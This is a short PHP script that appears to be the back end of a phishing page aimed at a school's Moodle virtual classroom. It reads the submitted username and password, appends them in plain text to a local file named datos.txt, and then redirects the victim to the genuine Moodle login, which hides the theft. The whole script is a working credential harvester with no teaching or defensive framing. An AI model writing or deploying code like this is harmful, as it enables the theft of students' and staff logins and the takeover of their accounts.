<?php
$username = $_POST['username'];
$password = $_POST['password'];

$linea = $username . " | " . $password . PHP_EOL;

// CREA el archivo si no existe
file_put_contents("datos.txt", $linea, FILE_APPEND);

header("Location: https://aulavirtual.iesthosicodina.cat/moodle/");
exit;
?>